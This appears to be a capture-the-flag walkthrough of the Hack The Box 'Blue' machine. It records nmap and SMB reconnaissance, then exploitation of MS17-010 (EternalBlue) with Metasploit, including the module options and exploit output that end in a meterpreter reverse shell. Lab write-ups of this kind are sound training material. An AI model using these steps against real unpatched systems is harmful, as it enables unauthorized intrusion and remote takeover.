![](assets/Pasted%20image%2020241010225832.png)
# Machine Name: Blue
**Platform:** Hack The Box
**Difficulty:**  Easy
**OS:** Windows

## Introduction

Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.

## Recon

* **Nmap Scan:** `nmap -Pn blue.htb -sVC -T4 -oN ~/Desktop/nmap/blue.txt`

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 23:04 JST
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 23:07 (0:01:42 remaining)
Nmap scan report for blue.htb (10.129.232.181)
Host is up (0.18s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-10T15:06:02+01:00
| smb2-time: 
|   date: 2024-10-10T14:05:59
|_  start_date: 2024-10-10T13:59:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.58 seconds
```

From what I see, the machine is a Windows machine with SMB open. 
Doing `smbclient  -L //blue.htb/` gave me below data.

```bash
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
cd do_connect: Connection to blue.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`Users` looks interesting, but i could not find anything useful
`smbclient  //blue.htb/Users`

```bash

smb: \> ls
  .                                  DR        0  Fri Jul 21 15:56:23 2017
  ..                                 DR        0  Fri Jul 21 15:56:23 2017
  Default                           DHR        0  Tue Jul 14 16:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 13:54:24 2009
  Public                             DR        0  Tue Apr 12 16:51:29 2011

                4692735 blocks of size 4096. 592683 blocks available
smb: \> exit

```
## Vulnerability Identification

* **Vulnerability 1:** vuln scan

```bash
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false

```

The vulnerability scan shows that the machine is vulnerable to `CVE-2017-0143`
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0143)

```text
A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 1.0 (SMBv1) server handles certain requests. An attacker who successfully exploited the vulnerability could gain the ability to execute code on the target server.
```

So it seems like the machine is vulnerable to certain Remote Code Execution.
Checking Metasploit gave me a lot of choices...

```bash
msf6 search CVE-2017-0143

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .
```

I initially chose #27 (DOUBLEPULSAR RCE) simply because it has `great` in rank, but this module was not the appropriate one for the current vulnerability.

Looking through other exploits, I found a module in #0 mentioning `eternalblue` . This was mentioned in the description of the machine. 

```bash

msf6 exploit(windows/smb/smb_doublepulsar_rce) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Wind
                                             ows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
                                             tandard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.193.129   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

The module asked me for RHOST ( Target ) and LHOST (Attacker IP) .  After setting up those, I ran and got the foothold. 

```bash

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.129.232.182:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.232.182:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.232.182:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.232.182:445 - The target is vulnerable.
[*] 10.129.232.182:445 - Connecting to target for exploitation.
[+] 10.129.232.182:445 - Connection established for exploitation.
[+] 10.129.232.182:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.232.182:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.232.182:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.232.182:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.232.182:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.232.182:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.232.182:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.232.182:445 - Sending all but last fragment of exploit packet
[*] 10.129.232.182:445 - Starting non-paged pool grooming
[+] 10.129.232.182:445 - Sending SMBv2 buffers
[+] 10.129.232.182:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.232.182:445 - Sending final SMBv2 buffers.
[*] 10.129.232.182:445 - Sending last fragment of exploit packet!
[*] 10.129.232.182:445 - Receiving response from exploit packet
[+] 10.129.232.182:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.232.182:445 - Sending egg to corrupted connection.
[*] 10.129.232.182:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.129.232.182
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.232.182:49158) at 2024-10-10 23:24:54 +0900
[+] 10.129.232.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.232.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.232.182:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

```
## Exploitation

After gaining access to the machine from the eternalblue module, I looked through the machine and found `User` and `Administrator` . 

Under `User`, I found `haris` and i found the `user.txt` under his desktop. I found the `root.txt` under `Administrator`'s `desktop`
## Lessons Learned

- The recon to get information and understand the correct vulnerability
- I should have read the CVE more closely. 
## Conclusion

- Super easy machine as long as you know what tool to use. 

**Happy hacking!**